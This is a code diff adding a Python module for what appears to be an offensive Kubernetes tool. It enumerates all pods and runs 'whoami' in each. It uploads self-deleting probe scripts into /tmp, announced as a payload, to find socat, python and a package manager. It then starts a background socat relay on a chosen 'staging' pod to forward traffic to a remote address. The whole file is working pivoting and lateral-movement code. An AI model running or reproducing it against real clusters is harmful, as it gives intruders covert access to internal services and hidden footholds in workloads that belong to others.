@@ -1,0 +1,232 @@
+from progress.bar import FillingCirclesBar
+from aproxy.providers.kubernetes_capabilites import KubeCapabilities
+from tempfile import TemporaryFile
+from kubernetes.stream.stream import stream
+from kubernetes.client import CoreV1Api, V1Pod
+import tarfile
+import traceback
+
+
+def find_eligible_staging_pod(client: CoreV1Api):
+    pods = client.list_pod_for_all_namespaces()
+    print(
+        f"[*] found {len(pods.items)} pods - checking for eligible staging candidates (this may take a while)"
+    )
+    pod_capabilities = []
+    with FillingCirclesBar("[*] Processing...", max=len(pods.items)) as bar:
+        for pod_info in pods.items:
+            capabilities = run_checks(client, pod_info)
+            pod_capabilities.append(capabilities)
+            bar.next()
+
+    eligible_pods = [pod for pod in pod_capabilities if pod.can_connect()]
+    print(f"[+] valid pods for proxy staging: {len(eligible_pods)}")
+    for pod in eligible_pods:
+        print(f"\t{pod.namespace}/{pod.pod_name}")
+
+    print(f"[+] selecting {eligible_pods[0]}")
+    return eligible_pods[0]
+
+
+def run_checks(client: CoreV1Api, pod_info: V1Pod) -> KubeCapabilities:
+    user_script = "whoami"
+    user = exec(
+        client, user_script, pod_info.metadata.name, pod_info.metadata.namespace
+    )
+
+    utils = find_required_utils(client, pod_info)
+    pkg_manager = find_package_manager(client, pod_info)
+
+    return KubeCapabilities(
+        user, pkg_manager, utils, pod_info.metadata.name, pod_info.metadata.namespace,
+    )
+
+
+def find_package_manager(client: CoreV1Api, pod_info: V1Pod):
+    pkg_manager_script = """#!/bin/sh
+if [ -x "$(which apk 2>/dev/null)" ]
+then
+    echo apk
+fi
+if [ -x "$(which apt-get 2>/dev/null)" ]
+then
+    echo apt
+fi
+if [ -x "$(which zypper 2>/dev/null)" ]
+then
+    echo zypper
+fi
+if [ -x "$(which yum 2>/dev/null)" ]
+then
+    echo yum
+fi
+"""
+
+    upload_script(
+        client,
+        pkg_manager_script,
+        "pkg_manager.sh",
+        pod_info.metadata.name,
+        pod_info.metadata.namespace,
+    )
+    pkg_manager = exec(
+        client,
+        "/bin/sh /tmp/pkg_manager.sh",
+        pod_info.metadata.name,
+        pod_info.metadata.namespace,
+    )
+
+    if pkg_manager and pkg_manager.find("exec failed") != -1:
+        pkg_manager = "none"
+
+    return pkg_manager
+
+
+def find_required_utils(client: CoreV1Api, pod_info: V1Pod):
+    script = """#!/bin/sh
+if [ -x "$(which socat 2>/dev/null)" ]
+then
+    echo socat
+fi
+if [ -x "$(which python 2>/dev/null)" ]
+then
+    echo python
+fi
+"""
+    upload_script(
+        client,
+        script,
+        "util_check.sh",
+        pod_info.metadata.name,
+        pod_info.metadata.namespace,
+    )
+    utils = exec(
+        client,
+        "sh /tmp/util_check.sh",
+        pod_info.metadata.name,
+        pod_info.metadata.namespace,
+    )
+
+    if utils and utils.find("exec failed") != -1:
+        utils = None
+    elif utils:
+        utils = utils.split("\n")
+
+    return utils
+
+
+def find_services(client: CoreV1Api):
+    services = []
+    service_list = client.list_service_for_all_namespaces()
+    for svc in service_list.items:
+        services.append((svc.metadata.name, svc.spec.cluster_ip))
+    return services
+
+
+def exec(client: CoreV1Api, cmd: str, name: str, namespace: str = "default", tty=False):
+    exec_command = cmd.split(" ")
+    try:
+        resp = stream(
+            client.connect_get_namespaced_pod_exec,
+            name,
+            namespace,
+            command=exec_command,
+            stderr=True,
+            stdin=False,
+            stdout=True,
+            tty=tty,
+        )
+        if not resp:
+            return None
+        if resp.lower().find("no such file or directory") != -1:
+            return None
+
+        return resp.strip()
+    except RuntimeError as err:
+        print(f"[!!] failed when executing command '{cmd}''")
+        print(traceback.format_exc())
+        return None
+
+
+def setup_staging(
+    client: CoreV1Api,
+    staging_pod: KubeCapabilities,
+    remote_address: str,
+    remote_port: int,
+):
+    if not staging_pod:
+        print("[!!] no staging pod available")
+        return False
+    print(
+        f"[+] starting reverse proxy on {staging_pod.namespace}/{staging_pod.pod_name} using {staging_pod.utils[0]} for {remote_address}:{remote_port}"
+    )
+
+    script = f"""#!/bin/sh
+if [ -z "$(ps -ef | grep '[s]ocat tcp-l:{remote_port}')" ]
+then 
+socat tcp-l:{remote_port},reuseaddr,fork tcp:{remote_address}:{remote_port} &
+fi
+"""
+    script_name = f"socat-{str(remote_port)}.sh"
+    upload_script(
+        client, script, script_name, staging_pod.pod_name, staging_pod.namespace
+    )
+
+    result = exec(
+        client, f"sh /tmp/{script_name}", staging_pod.pod_name, staging_pod.namespace,
+    )
+    return True
+
+
+def upload_script(
+    client: CoreV1Api, script: str, file_name: str, pod_name: str, namespace: str
+):
+    script += f"\nrm -Rf /tmp/{file_name}\n"
+    with TemporaryFile() as file:
+        file.write(script.encode())
+        size = file.tell()
+        file.seek(0)
+
+        upload(client, pod_name, namespace, file_name, file, size)
+
+
+def upload(
+    client: CoreV1Api, pod_name: str, namespace: str, file_name, file, file_size
+):
+    print(f"[*] uploading payload [{file_name}]")
+    cmd = ["tar", "xvf", "-", "-C", "/tmp"]
+    try:
+        resp = stream(
+            client.connect_get_namespaced_pod_exec,
+            pod_name,
+            namespace,
+            command=cmd,
+            stderr=True,
+            stdin=True,
+            stdout=True,
+            _preload_content=False,
+        )
+
+        source_file = file
+
+        with TemporaryFile() as tar_buffer:
+            with tarfile.open(fileobj=tar_buffer, mode="w") as tar:
+                tarinfo = tarfile.TarInfo(file_name)
+                tarinfo.size = file_size
+                tar.addfile(tarinfo, fileobj=file)
+
+            tar_buffer.seek(0)
+            commands = []
+            commands.append(tar_buffer.read())
+
+            while resp.is_open():
+                resp.update(timeout=1)
+                if commands:
+                    c = commands.pop(0)
+                    resp.write_stdin(c)
+                else:
+                    break
+            resp.close()
+    except:
+        print("[!!] failed to upload file")
+        return None
